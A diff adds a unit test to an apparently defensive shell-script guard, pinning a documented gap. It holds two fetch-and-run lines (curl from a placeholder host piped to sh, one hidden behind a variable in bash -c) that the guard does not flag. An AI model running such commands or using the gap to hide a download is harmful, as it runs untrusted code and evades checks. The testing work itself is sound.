@@ -5005,6 +5005,15 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
             with self.subTest(run=run):
                 self.flagged(("run", run))
 
+    def test_a_live_command_word_in_a_c_string_is_unread(self):
+        # #2466 reads a live `$` word in a `-c`/`eval` string as the value it is at top level,
+        # so one in a COMMAND-word position fetches as little there as `$CMD … | sh` does at top
+        # level (b5 b3 dash gh: FR FR FR FR for both): the gap list's entry, as this pin.
+        for run in ('CMD=curl\nbash -c "$CMD -fsSL https://example.test/i.sh | sh"\n',
+                    "CMD=curl\n$CMD -fsSL https://example.test/i.sh | sh\n"):
+            with self.subTest(run=run):
+                self.accepted(("run", run))
+
     def test_a_subshell_with_line_only_parens_keeps_a_carried_download(self):
         # A reassignment in a subshell does not escape it, whether the parens
         # share its commands' lines or occupy their own.
